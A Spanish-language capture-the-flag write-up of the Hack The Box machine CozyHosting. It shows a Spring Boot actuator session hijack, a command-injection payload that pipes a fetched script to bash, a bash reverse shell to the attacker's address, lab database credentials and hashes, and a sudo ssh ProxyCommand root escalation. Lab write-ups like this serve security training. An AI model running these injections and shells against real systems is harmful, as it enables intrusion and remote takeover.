# Cozyhosting

![](../../../../~gitbook/image.md)Publicado: 15 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
CozyHosting es una máquina Linux que aloja una aplicación web de un servicio de hosting. La explotación comienza con la enumeración de servicios, donde encontramos un servidor web ejecutando una aplicación Spring Boot.La máquina presenta múltiples vectores de ataque que incluyen:- Exposición de endpoints sensibles en la aplicación Spring Boot (/actuator)
- Uso de sesiones inseguras que pueden ser manipuladas
- Inyección de comandos en una funcionalidad de conexión SSH
- Credenciales almacenadas en archivos de configuración
- Escalada de privilegios mediante sudo mal configurado
El objetivo es obtener acceso inicial como usuario app mediante la inyección de comandos, pivotear al usuario josh usando credenciales encontradas en la base de datos PostgreSQL, y finalmente escalar a root abusando de permisos sudo para el binario SSH.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP
http://cozyhosting.htb![](../../../../~gitbook/image.md)Hay un panel de login que nos permite enumerar la tecnología del sitio web junto con la extensión wappalyzer:![](../../../../~gitbook/image.md)🕷️Fuzzing de vhostsNo hallamos resultados.Revisando el código fuente enumeramos el nombre de la template que se está usando y la versión de Bootstrap![](../../../../~gitbook/image.md)Aunque no encontramos vulnerabilidades ni exploits para estas versiones🕷️Fuzzing de directoriosTras probar a realizar fuzzing de directorios con las herramientas gobuster y feroxbusterObservamos un recurso /error que está devolviendo un error 500![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Este error es generado por una aplicación Spring Boot, cuando ocurre un error no manejado y no hay una ruta `/error` personalizada definida.Probamos a realizar fuzzint también con dirsearch y tenemos más suerte:![](../../../../~gitbook/image.md)Ahora que sabemos que la aplicación está usando springboot, existe un endpoint que utiliza spring boot para exponer los endpoints que se llama /actuator:http://cozyhosting.htb/actuator![](../../../../~gitbook/image.md)En el endponint de sessions vemos lo que parece ser o bien una cookie. De hecho por cada intento de sesión no autenticado vemos como se refleja en el endpoint:![](../../../../~gitbook/image.md)Optamos por la vía de pensar que pueda tratarse de una cookie y la seteamos:![](../../../../~gitbook/image.md)Accedemos con éxito al panel de admin como usuario kanderson:![](../../../../~gitbook/image.md)Al enumerar el servicio vemos lo que parece ser una utilidad para establecer conexión vía ssh:![](../../../../~gitbook/image.md)Interceptamos la petición con burp y vemos la respuesta:![](../../../../~gitbook/image.md)Aquí comenzamos a probar con posibles inyecciones de comandos para ver si el parámetro username es vulnerable.Encontramos este payload que nos permite confirmarlo:Con el carácter ";" permitimos escapar y ejecutar nuestro comando, usamos ${IFS} para que nos indique que el comando no puede contener espacios y finalmente cerramos con otro ";" y un hashtag # para que ignore todo lo que hay a continuación.Si iniciamos un listener en nuestro host de ataque en el puerto 80Y a continuación lanzamos la petición con la inyección de comandos, veremos que hay respuesta:![](../../../../~gitbook/image.md)SI aplicamos esta PoC creando un archivo index.html con el siguiente contenido:Lo disponibilizamos en un servidor web con python:Probamos a realizar un curl a nuestra propia máquina par verificar que hay respuesta:![](../../../../~gitbook/image.md)Iniciamos un listener en el puerto anteriormente especificadoLanzamos la petición añadiendo el pipe "|" con bash para que se ejecute el contenido con bash:Recibimos la reverse shell:![](../../../../~gitbook/image.md)
#### Foothold
Una vez dentro, vemos que existe un usuario josh en el directorio /home pero no tenemos permisos para enumerar nada aquí.
Enumeramos la máquina en busca de vectores que permitan la escaladaCapabilitiesPermisosGruposRevisamos el fichero de configuración de nginx por si encontrásemos alguna credencial, vhost o algún recursos de utilidad:Si revisamos el fichero /etc/passwd vemos que únicamente el usuario josh tiene login:No hallamos nada relevante.Sí encontramos un archivo .jar en el directorio /app que merece la pena analizar:Lo copiamos al directorio /tmp ya que necesitamos descomprimirlo:O también podemos transferirlo a nuestro host de ataque de la siguiente formaSi optamos por esta segunda vía, podemos verificar la integridad de la transferencia usando md5sum en el origen y en el destino para ver si coinciden.Una vez descomprimido el archivo podemos usar el comando tree para ver la estructura de archivos y ver algo interesante.Tras enumerar el contenido encontramos un fichero application.properties con credenciales de una base de datos postgres:![](../../../../~gitbook/image.md)Si revisamos los puertos /servicios que se están ejecutando localmente en la máquina vemos que efectivamente en el 5432 hay un postgres:![](../../../../~gitbook/image.md)Podemos conectarnos con las credenciales encontradas de la siguiente formaUna vez dentro enumeramos las tablas usando el comando \dt:Y a continuación consultamos el contenido de la tabla users:Procedemos a intentar crackear estos hashes usando hashcat y rockyou y tenemos éxito con el hash del usuario admin:![](../../../../~gitbook/image.md)
#### 👑 Escalada de privilegios
No hay ningún usuario admin en el sistema, recordemos cuando hemos enumerado el directorio /home y el fichero /etc/passwd que únicamente había uno llamado josh, veamos si se está llevando a cabo la mala práctica de reutilización de contraseñas.![](../../../../~gitbook/image.md)Buscamos ahora la escalada de privilegios a root desde el usuario josh y vemos que este usuario puede ejecutar el siguiente binario como root:Buscamos información sobre este binario en gtfobins:
https://gtfobins.github.io/gtfobins/ssh/#sudoY usamos el siguiente comando para la escalada y obtenemos la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯   ping -c2 10.10.11.230
PING 10.10.11.230 (10.10.11.230) 56(84) bytes of data.
64 bytes from 10.10.11.230: icmp_seq=1 ttl=63 time=47.5 ms
64 bytes from 10.10.11.230: icmp_seq=2 ttl=63 time=47.8 ms

--- 10.10.11.230 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 47.494/47.662/47.830/0.168 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.230 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.230 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:54 CEST
Nmap scan report for 10.10.11.28
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds

```

```
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://cozyhosting.htb -H 'Host:FUZZ.cozyhosting.htb' -fs 178
```

```
feroxbuster -u http://cozyhosting.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 404
```

```
feroxbuster -u http://cozyhosting.htb -r  -w /usr/share/seclists/Discovery/Web-Content/common.txt --scan-dir-listings -C 404
```

```
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502 -x .php, .txt, .xml -r
```

```
dirsearch -u http://cozyhosting.htb
```

```
host=localhost&username=test;curl${IFS}10.10.14.14;#
```

```
nc -nlvp 80
```

```
# !/bin/bash

bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
```

```
python3 -m http.server 80
```

```
❯ curl localhost

# !/bin/bash

bash -i >& /dev/tcp/10.10.14.14/4444 0>&1

```

```
nc -nlvp 4444
```

```
host=localhost&username=test;curl${IFS}10.10.14.14|bash;#
```

```
getcap -r / 2>/dev/null
```

```
find / -perm -4000 2>/dev/null
```

```
id
```

```
cat /etc/nginx/sites-enabled/default
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

```
cp cloudhosting-0.0.1.jar /tmp
unzip cloudhosting-0.0.1.jar
```

```
cat  /dev/tcp/10.10.14.14/443
```

```
nc -nlvp 443
```

```
psql -h localhost -p 5432 -U postgres -d cozyhosting
Vg&nvzAQ7XxR
```

```
cozyhosting=# \dt

List of relations
Schema | Name  | Type  |  Owner
--------+-------+-------+----------
public | hosts | table | postgres
public | users | table | postgres
(2 rows)
```

```
cozyhosting=# select * from users;
name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

```
su josh
manchesterunited
```

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
(root) /usr/bin/ssh *
josh@cozyhosting:~$
```

```
sudo ssh -o ProxyCommand=';sh 0&2' x
```

```
uid=0(root) gid=0(root) groups=0(root)
# ls
root.txt
```
